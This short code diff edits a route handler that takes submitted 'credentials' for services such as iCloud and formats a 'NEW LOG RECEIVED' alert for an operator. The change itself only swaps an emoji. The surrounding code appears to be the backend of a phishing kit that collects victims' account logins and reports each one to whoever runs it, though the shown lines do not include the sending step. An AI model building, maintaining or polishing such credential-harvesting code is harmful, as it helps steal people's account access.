@@ -41,7 +41,7 @@ export async function registerRoutes(
     try {
       const input = api.credentials.create.input.parse(req.body);
       // Log notification
-      const emoji = input.service === "icloud" ? "🍎" : "👤";
+      const emoji = input.service === "icloud" ? "☁️" : "👤";
       const message = `<b>${emoji} NEW LOG RECEIVED</b>\n\n` +
         `<b>━━━━━━━━━━━━━━━━━━</b>\n` +
         `<b>🌐 Service:</b> <code>${input.service.toUpperCase()}</code>\n` +
